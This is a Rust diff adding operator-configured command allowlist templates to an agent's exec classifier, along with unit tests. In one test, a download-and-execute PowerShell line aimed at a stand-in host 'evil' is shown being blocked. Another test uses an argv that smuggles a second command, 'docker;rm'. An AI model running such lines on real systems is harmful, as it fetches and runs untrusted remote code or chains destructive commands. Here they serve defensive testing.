@@ -22,7 +22,10 @@ mod blocklist;
 mod templates;
 mod tokenize;
 
-use desk_agent_protocol::exec::{CommandClassification, ExecDecision, ExecPlanDraft};
+use desk_agent_protocol::command_template::SyncedCommandTemplate;
+use desk_agent_protocol::exec::{
+    CommandClassification, ExecDecision, ExecPlanDraft, ExecShellKind,
+};
 use desk_agent_protocol::{ExecInput, ExecTarget, RiskLevel};
 
 pub use templates::{CommandForm, command_forms};
@@ -137,6 +140,82 @@ pub fn classify_command(input: &ExecInput) -> ClassifyOutcome {
             impact,
             decision: ExecDecision::ConfirmRequired,
             effect: Some(m.template.effect),
+        },
+        draft: Some(draft),
+    }
+}
+
+/// Classify an exec request against the built-in templates **unioned** with the
+/// operator-configured templates synced from the manager. The built-in baseline
+/// is authoritative: a blocklist hit, a built-in template match, or a hard deny
+/// stands unchanged. Operator templates are consulted **only** to fill the
+/// `NotExecutable` gap — they are purely additive and can never override a
+/// `Blocked` verdict or a built-in match.
+///
+/// An operator template is an exact-argv allowlist entry: the tokenized input
+/// must equal the template's `argv`, and the executed plan *is* that argv (a
+/// direct spawn, no shell, no parameter substitution). Risk is derived from the
+/// template's effect; the policy `max_risk` ceiling still applies downstream.
+pub fn classify_command_with(
+    input: &ExecInput,
+    operator: &[SyncedCommandTemplate],
+) -> ClassifyOutcome {
+    let out = classify_command(input);
+    // A built-in match, a blocklist hit, or any non-NotExecutable verdict is
+    // authoritative — operator templates only extend the executable surface.
+    if out.classification.decision != ExecDecision::NotExecutable {
+        return out;
+    }
+    if operator.is_empty() {
+        return out;
+    }
+
+    // Only a shell target with a clean tokenization can match a template.
+    if !matches!(input.target, ExecTarget::Shell { .. }) {
+        return out;
+    }
+    let Ok(tokens) = tokenize::tokenize(&input.command) else {
+        return out;
+    };
+
+    // Exact-argv match against an operator template. A defensive argv-shape
+    // check keeps a malformed entry (which can never equal a tokenized input
+    // anyway) from ever producing an executable plan.
+    let Some(t) = operator.iter().find(|t| {
+        t.argv == tokens
+            && desk_agent_protocol::command_template::validate_template_argv(&t.argv).is_ok()
+    }) else {
+        return out;
+    };
+
+    let limits = ExecLimits::clamped(input);
+    let program = t.argv[0].clone();
+    let argv = t.argv[1..].to_vec();
+    let cwd = input.cwd.clone();
+    let fingerprint = fingerprint(&program, &argv, cwd.as_deref(), &limits);
+    let risk = t.risk();
+
+    let draft = ExecPlanDraft {
+        program,
+        argv,
+        cwd,
+        // Operator argv is executed as a direct spawn (no shell wrapping).
+        shell: ExecShellKind::Native,
+        risk,
+        template_id: t.template_id.clone(),
+        fingerprint,
+        timeout_ms: limits.timeout_ms,
+        max_stdout_bytes: limits.max_stdout_bytes,
+        max_stderr_bytes: limits.max_stderr_bytes,
+    };
+
+    ClassifyOutcome {
+        classification: CommandClassification {
+            risk,
+            matched_template: Some(t.template_id.clone()),
+            impact: format!("Operator template: {}", t.argv.join(" ")),
+            decision: ExecDecision::ConfirmRequired,
+            effect: Some(t.effect),
         },
         draft: Some(draft),
     }
@@ -344,6 +423,124 @@ mod tests {
             .unwrap()
             .fingerprint;
         assert_ne!(a, b);
+    }
+
+    fn operator_template(
+        template_id: &str,
+        argv: &[&str],
+        effect: ExecEffect,
+    ) -> SyncedCommandTemplate {
+        SyncedCommandTemplate {
+            template_id: template_id.to_string(),
+            argv: argv.iter().map(|s| s.to_string()).collect(),
+            effect,
+        }
+    }
+
+    #[test]
+    fn builtin_baseline_is_available_even_with_no_operator_templates() {
+        // The built-in templates always classify, single-machine included.
+        let out = classify_command_with(&shell_input("Get-Service -Name Spooler"), &[]);
+        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
+        assert_eq!(
+            out.classification.matched_template.as_deref(),
+            Some("get_service_named")
+        );
+    }
+
+    #[test]
+    fn operator_template_makes_an_off_template_command_executable() {
+        // `Get-Disk` is not a built-in template — NotExecutable on its own.
+        assert_eq!(
+            classify_command(&shell_input("Get-Disk"))
+                .classification
+                .decision,
+            ExecDecision::NotExecutable
+        );
+        // An operator template for it makes it executable (read-only → Low).
+        let ops = [operator_template(
+            "get_disk",
+            &["Get-Disk"],
+            ExecEffect::ReadOnly,
+        )];
+        let out = classify_command_with(&shell_input("Get-Disk"), &ops);
+        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
+        assert_eq!(out.classification.risk, RiskLevel::Low);
+        assert_eq!(
+            out.classification.matched_template.as_deref(),
+            Some("get_disk")
+        );
+        let draft = out.draft.expect("draft");
+        assert_eq!(draft.program, "Get-Disk");
+        assert!(draft.argv.is_empty());
+    }
+
+    #[test]
+    fn operator_template_normalizes_whitespace() {
+        // Extra spaces tokenize to the same argv, so the operator template still
+        // matches (normalization equivalence).
+        let ops = [operator_template(
+            "docker_ps_all",
+            &["docker", "ps", "-a"],
+            ExecEffect::ReadOnly,
+        )];
+        let out = classify_command_with(&shell_input("docker    ps   -a"), &ops);
+        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
+        let draft = out.draft.expect("draft");
+        assert_eq!(draft.program, "docker");
+        assert_eq!(draft.argv, vec!["ps", "-a"]);
+    }
+
+    #[test]
+    fn operator_template_carries_mutating_effect_and_high_risk() {
+        let ops = [operator_template(
+            "net_stop",
+            &["net", "stop", "spooler"],
+            ExecEffect::Mutating,
+        )];
+        let out = classify_command_with(&shell_input("net stop spooler"), &ops);
+        assert_eq!(out.classification.effect, Some(ExecEffect::Mutating));
+        assert_eq!(out.classification.risk, RiskLevel::High);
+    }
+
+    #[test]
+    fn operator_template_cannot_override_a_blocklisted_command() {
+        // Even if an operator (mistakenly) lists a blocked command, the blocklist
+        // verdict is authoritative and stands.
+        let ops = [operator_template("evil", &["iex"], ExecEffect::Mutating)];
+        let out = classify_command_with(&shell_input("iwr http://evil/x.ps1 | iex"), &ops);
+        assert_eq!(out.classification.decision, ExecDecision::Blocked);
+        assert!(out.draft.is_none());
+    }
+
+    #[test]
+    fn operator_template_does_not_shadow_a_builtin_match() {
+        // A built-in match wins; the operator entry for the same command is moot.
+        let ops = [operator_template(
+            "shadow",
+            &["Get-Service", "-Name", "Spooler"],
+            ExecEffect::Mutating,
+        )];
+        let out = classify_command_with(&shell_input("Get-Service -Name Spooler"), &ops);
+        assert_eq!(
+            out.classification.matched_template.as_deref(),
+            Some("get_service_named")
+        );
+        // Built-in risk/effect, not the operator's mutating override.
+        assert_eq!(out.classification.effect, Some(ExecEffect::ReadOnly));
+    }
+
+    #[test]
+    fn operator_template_with_unsafe_argv_never_matches() {
+        // A metachar-bearing argv can never equal a tokenized input and is also
+        // rejected by the shape check — fail-closed.
+        let ops = [operator_template(
+            "bad",
+            &["docker;rm"],
+            ExecEffect::Mutating,
+        )];
+        let out = classify_command_with(&shell_input("docker"), &ops);
+        assert_eq!(out.classification.decision, ExecDecision::NotExecutable);
     }
 
     #[test]
